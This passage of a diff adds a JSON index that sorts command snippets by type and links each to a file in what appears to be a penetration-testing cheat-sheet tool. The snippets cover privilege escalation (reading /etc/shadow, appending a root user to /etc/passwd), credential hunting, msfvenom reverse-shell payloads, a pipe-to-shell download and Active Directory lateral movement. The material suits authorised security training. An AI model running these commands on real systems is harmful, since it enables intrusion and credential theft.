+        "text": "PowerUp's Get-UnquotedService",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-ModifiableServiceFile",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Get-RegistryAlwaysInstallElevated",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp's Find-ProcessDLLHijack",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Watson (PowerShell-based)",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "whoami /all",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "PowerUp.ps1 Invoke-AllChecks",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "sc sdshow <service>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "dir /s /b C:\\*.dll 2>nul",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "cat /etc/sudoers (if readable)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "ls -la /root/ (check if can list root directory)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "cat /etc/shadow (attempt to read directly)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "ls -la /root/",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "cat /etc/shadow",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "find <PATH> -name '*.php' -exec grep -i password {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "find <PATH> -name 'config*' -exec cat {} +",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "getent passwd | grep -v nologin | cut -d: -f1",
+        "file": "data/commands/post-exploit/credential-discovery.json"
+      },
+      {
+        "text": "grep -r '/etc/cron' /etc/",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "echo 'newroot:$1$salt$hash:0:0:root:/root:/bin/bash' >> /etc/passwd",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /proc/version",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "nmap --script nfs-showmount",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "docker run -v /:/hostfs -it ubuntu bash",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "find / -name authorized_keys",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "grep -r 'PRIVATE KEY' /home 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /etc/sudoers 2>/dev/null",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "cat /etc/os-release",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "wget -O - https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Transfer manually and run: ./linpeas.sh",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "watch -n 1 'ps aux | grep -v grep'",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "showmount -e localhost",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "ls -la /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "getcap /bin/systemctl",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "find /etc -name '*.sh' -exec grep '\\*' {} \\;",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Search exploit-db for capability-based techniques",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use different exploitation technique for same capability/binary",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Identified capability/binary combination from previous steps",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Edit /etc/shadow instead if cap allows: remove root password hash",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use cp command with cap_dac_override to overwrite passwd: cp modified_passwd /etc/passwd",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Use tar to extract modified passwd over existing: tar -xzf passwd.tar.gz -C /",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "wfuzz -c -z file,<WORDLIST> -d \"fm_usr=<USER>&fm_pwd=FUZZ\" --hs \"<FAIL_STRING>\" http://<TARGET>/<PAGE>",
+        "file": "data/commands/enumeration/password-attacks-hydra.json"
+      },
+      {
+        "text": "ls \\\\<TARGET>\\<SHARE>",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "python scripts: gpp-decrypt.py",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "$env:USERDNSDOMAIN | ForEach-Object { 'DC=' + ($_ -replace '\\.',',DC=') }",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "hashcat -m 22921 (aes-256-cbc only, NOT aes-256-ctr)",
+        "file": "data/commands/enumeration/password-attacks-john.json"
+      },
+      {
+        "text": "Manual: for pw in $(cat wordlist); do echo -n \"$pw\" | md5sum; done",
+        "file": "data/commands/enumeration/password-attacks-hashcat.json"
+      },
+      {
+        "text": "mysql -h <TARGET> -u <USER> -p (interactive password prompt)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "postgres-direct-connect (with password inline)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "Download from: https://live.sysinternals.com/PsExec64.exe",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "smbmap -u <USER> -p <PASS> -H <TARGET>",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "grep -r '<QUERY>' /usr/share/metasploit-framework/modules/exploits/",
+        "file": "data/commands/exploitation/metasploit-core.json"
+      },
+      {
+        "text": "nmap <OPTIONS> <TARGET> -oX scan.xml && msf-db-import scan.xml",
+        "file": "data/commands/exploitation/metasploit-core.json"
+      },
+      {
+        "text": "msfvenom -p linux/x86/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p windows/shell_reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "msfvenom -p windows/meterpreter/reverse_tcp",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "google: site:exploit-db.com <SERVICE>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Update ExploitDB: searchsploit -u",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Find exploit first: searchsploit <SERVICE> <VERSION>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Get script help: nmap --script-help <SCRIPT_NAME>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Identify web technology: whatweb http://<TARGET>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Run gobuster first: gobuster-dir-common (complement findings)",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "nc -nvlp <LPORT> (for non-staged shells only)",
+        "file": "data/commands/exploitation/metasploit-handlers.json"
+      },
+      {
+        "text": "WinRM enabled on target (port 5985/5986)",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "pth-impacket-psexec per target",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Use -X for PowerShell commands",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "msfconsole exploit/multi/handler for Meterpreter shells",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "psexec-impacket-shell for direct SYSTEM shell",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "Base64 payload generated with revshell-ps-generator",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "dcom-shellwindows (similar technique)",
+        "file": "data/commands/exploitation/ad-lateral-movement-dcom.json"
+      },
+      {
+        "text": "ls /usr/share/metasploit-framework/modules/auxiliary/scanner/<SERVICE>/",
+        "file": "data/commands/exploitation/metasploit-auxiliary.json"
+      },
+      {
+        "text": "psexec-impacket-shell with -hashes",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "msfvenom -p windows/x64/meterpreter_reverse_tcp (Meterpreter instead)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "msfvenom -p linux/x64/meterpreter_reverse_tcp (Meterpreter variant)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "msfvenom -p java/jsp_shell_reverse_tcp -f war (WAR file for manager deployment)",
+        "file": "data/commands/exploitation/metasploit-payloads.json"
+      },
+      {
+        "text": "overpass-mimikatz-pth already executed",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Invoke-Mimikatz for remote export",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus ptt /ticket:<FILE>",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "service ssh start - SysVinit alternative (older systems)",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "updog - HTTP server with upload support (pip install updog)",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "smb-server - SMB file sharing alternative",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "nmap localhost - External port scan verification",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "netstat -rn - Netstat routing table view",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "curl http://<TARGET>:<PORT> - HTTP service verification",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "Port forward if internal network: ssh -L <LOCAL_PORT>:<TARGET>:<PORT> <SSH_USER>@<SSH_HOST>",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "crackmapexec smb - Modern SMB enumeration and exploitation framework",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "wmic os get caption,version - Specific OS version",
+        "file": "data/commands/pivoting/windows-utilities.json"
+      },
+      {
+        "text": "whoami /all - Complete user info",
+        "file": "data/commands/pivoting/windows-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without SSH encryption, no authentication required",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "plink-remote-forward + microsocks - Workaround for OpenSSH <7.6",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "Pivot host can route to destination: ip route, ping <DEST_IP>",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "chisel - HTTP tunneling if SSH blocked",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Simple relay without authentication",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Firewall allows outbound SSH from Windows: Test-NetConnection <SSH_HOST> -Port 22",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "plink-remote-forward - Windows SSH client alternative",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Proxychains configured: /etc/proxychains4.conf has correct SOCKS proxy",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "socat-port-forward - Set up relay on pivot host",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "state_condition": [
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/active-directory-additions.json"
+      },
+      {
+        "text": "Neo4j running",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "docker pull alpine (if no images available)",
+        "file": "data/commands/post-exploit/linux-docker-commands.json"
+      },
+      {
+        "text": "wget if curl unavailable",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "Use wget/curl if available",
+        "file": "data/commands/post-exploit/exfiltration.json"
+      },
+      {
+        "text": "getcap utility installed (part of libcap package)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "nmap -sn <SUBNET> (if dsquery unavailable)",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "PowerView imported",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "sqli-union-mysql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "sqli-union-postgresql-info (if SQL injection available)",
+        "file": "data/commands/exploitation/database-access.json"
+      },
+      {
+        "text": "Impacket installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "nmap installed (default on Kali)",
+        "file": "data/commands/exploitation/ad-lateral-movement-psexec.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "nmap installed on Kali (pre-installed)",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      },
+      {
+        "text": "Evil-WinRM installed on Kali",
+        "file": "data/commands/exploitation/ad-lateral-movement-winrm.json"
+      },
+      {
+        "text": "CrackMapExec installed",
+        "file": "data/commands/exploitation/ad-lateral-movement-wmi.json"
+      },
+      {
+        "text": "NTLM hash obtained",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Mimikatz available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Rubeus.exe available",
+        "file": "data/commands/exploitation/ad-lateral-movement-kerberos.json"
+      },
+      {
+        "text": "Nmap installed: sudo apt install nmap",
+        "file": "data/commands/pivoting/linux-utilities.json"
+      },
+      {
+        "text": "plink-remote-forward - Windows alternative using Plink when OpenSSH unavailable",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "Socat installed on pivot host: which socat (if not found: sudo apt install socat)",
+        "file": "data/commands/pivoting/ssh-tunneling.json"
+      },
+      {
+        "text": "RDP service running on target: nmap -p 3389 -Pn <TARGET>",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "Python available on pivot host: which python3 (usually present by default)",
+        "file": "data/commands/pivoting/pivot-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <SOCKS_PORT> or ssh -R <SOCKS_PORT> (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D <PORT> or ssh -R <PORT>",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      },
+      {
+        "text": "SOCKS proxy running: ssh -D or ssh -R (remote dynamic)",
+        "file": "data/commands/pivoting/proxychains-utilities.json"
+      }
+    ],
+    "powershell_import": [
+      {
+        "text": "Import SharpHound data",
+        "file": "data/commands/generated/post-exploitation-additions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView: . .\\PowerView.ps1",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-core.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Import PowerView",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      }
+    ],
+    "powershell_cmdlet": [
+      {
+        "text": "Get-CimInstance win32_process",
+        "file": "data/commands/monitoring/process-enumeration.json"
+      },
+      {
+        "text": "Get-ComputerInfo (PowerShell)",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ADUser $env:USERNAME",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ScheduledTask | Select TaskName,Principal",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-Acl HKLM:\\System\\CurrentControlSet\\Services\\<service>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-ADUser -Filter *",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-legacy-enumeration.json"
+      },
+      {
+        "text": "Get-ADUser -Identity <USERNAME> -Properties *",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Get-GPPPassword (PowerSploit)",
+        "file": "data/commands/enumeration/ad-session-share-enum.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-NetGroup",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-NetUser -AdminCount",
+        "file": "data/commands/enumeration/ad-powershell-ldap.json"
+      },
+      {
+        "text": "Get-Acl",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'WriteProperty'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      }
+    ],
+    "instruction": [
+      {
+        "text": "Manual check with: sc qc <servicename>",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Manual MSI creation with WiX Toolset",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Manual searchsploit of OS version",
+        "file": "data/commands/post-exploit/windows.json"
+      },
+      {
+        "text": "Check nmap version: nmap --version (if < 5.21, interactive works)",
+        "file": "data/commands/post-exploit/linux-sudo-commands.json"
+      },
+      {
+        "text": "Manual review of find output",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "Manual binary analysis: strings /path/to/binary",
+        "file": "data/commands/post-exploit/linux-suid-basic-commands.json"
+      },
+      {
+        "text": "Manual enumeration with individual commands",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Check /etc/sudoers if readable",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Manual search in /usr/bin and /usr/sbin",
+        "file": "data/commands/post-exploit/linux.json"
+      },
+      {
+        "text": "Check specific binary: getcap /usr/bin/python3 (test known binary)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Test shadow file read: cat /etc/shadow 2>/dev/null | grep root",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Test sudo without password: sudo -l (if sudoers allows)",
+        "file": "data/commands/post-exploit/linux-capabilities-commands.json"
+      },
+      {
+        "text": "Manual check: Look for 'CN=Users' or 'CN=Groups' in DN path",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Manual iteration without recursion",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Manual attribute inspection: $script:AllUsers[-1].Properties | select description,info,comment",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check module path: (Get-Module PowerView).Path | Select-String -Pattern 'version'",
+        "file": "data/commands/enumeration/ad-powershell-nested-groups.json"
+      },
+      {
+        "text": "Check for AllExtendedRights (includes ForceChangePassword): Get-ObjectAcl | ? {$_.ActiveDirectoryRights -match 'ExtendedRight'}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Manual enumeration: Get-ObjectAcl -Identity <TARGET> | ? {$_.SecurityIdentifier -eq <YOUR_SID>}",
+        "file": "data/commands/enumeration/ad-powerview-permissions.json"
+      },
+      {
+        "text": "Check service fingerprint manually",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check robots.txt first: curl http://<TARGET>/robots.txt",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check for rate limiting: Test with small wordlist first",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Verify web server is up: curl -I http://<TARGET>:<PORT>",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Check robots.txt and source code manually",
+        "file": "data/commands/exploitation/general.json"
+      },
+      {
+        "text": "Manual testing with evil-winrm",
+        "file": "data/commands/exploitation/ad-lateral-movement-pth.json"
+      },
+      {
+        "text": "Manual base64-encode-powershell with custom payload",
+        "file": "data/commands/exploitation/ad-lateral-movement-helpers.json"
+      }
+    ]
+  }
+}
